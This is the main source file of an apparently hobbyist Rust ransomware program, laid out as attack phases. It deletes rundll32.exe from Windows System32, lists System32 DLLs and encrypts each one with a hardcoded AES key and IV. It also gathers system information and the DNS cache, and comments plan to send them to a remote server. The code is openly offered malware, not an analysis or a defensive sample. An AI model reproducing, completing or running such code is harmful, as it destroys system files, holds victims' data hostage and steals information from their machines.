mod utils;
mod del_file;
mod img;
mod file_io;
mod hash;
mod io_file;
mod sysInfo_gathering;
mod tranfer;
mod dns;

struct Phase{
    first: u8,
    second: u8,
    last: u8,
}

impl Phase {
    fn new() -> Self{
        Phase { first: 0,second: 0, last: 0 }
    }

    fn first_attack(self) -> Self{
        del_file::init_delete_file("/C:/Windows/System32/rundll32.exe");
                
        img::open();

        Self::done_first(self)
    }

    fn second_attack(self) -> Self{
        // https://github.com/dongsub-joung/rust_CLI/blob/main/file_hashing_cli/src/main.rs
        // search some *.dll files in sys32 -> save a .txt file
        let search_dir= "/C:/Windows/System32";
        let _= file_io::save_searced_files(search_dir);
        
        let file_names_v: Vec<String>= file_io::read_a_file().unwrap_or(
            Vec::new()
        );

        for file in file_names_v {
            let pwd= format!("{}/{}", search_dir, file);
            Self::init_ransome(pwd);
        }

        // end
        self.done_sencond()
    }

    fn the_last_attack(self) -> Self{

        self.done_last()
    }

    fn init_ransome(pwd: String) {
        let mut result: Vec<u8>= Vec::new();
        let key = b"MyNameIsJoungDongSub"; // Replace with your own key
        let iv = b"SomeOneHelpMePlz"; // Replace with your own initialization vector

        // let plaintext = "Hello, this is a secret message!";
        let plaintext= io_file::io_file::selecteing_file(&pwd)
            .expect("can't parse the data");

        result= match hash::hashing::encrypt_string(key, iv, plaintext.as_str()) {
            Ok(ciphertext) => {
                ciphertext
            },
            
            Err(e) => {
                eprintln!("Encryption error: {:?}", e);
                let mut null_vec: Vec<u8>= Vec::new();
                null_vec
            },
        };

        io_file::io_file::saving_file(&result).expect("faild a saveing work");

        println!("Done!");
    }
    
    fn done_first(mut self) -> Self{
        self.first= 1;
        self
    }
     
    fn done_sencond(mut self) -> Self{
        self.second= 1;
        self
    }
     
    fn done_last(mut self) -> Self{
        self.last= 1;
        self
    }
}

fn main() {
    let mut code= Phase::new();

    utils::show_logo();

    code= Phase::first_attack(code);
    code= Phase::second_attack(code);

    // https://github.com/dongsub-joung/malwares/tree/main/systemInfGathering
    // ./report.html
    let _= sysInfo_gathering::init();
    // The Simple Mail Transfer Protocol (SMTP) conn or SSH ec2 AWS

    code= Phase::the_last_attack(code);
    
    // The Simple Mail Transfer Protocol (SMTP) conn or SSH ec2 AWS
    dns::save_dns_cache();
    // send a code and dns cache to server

    utils::print_time();

    utils::done();
}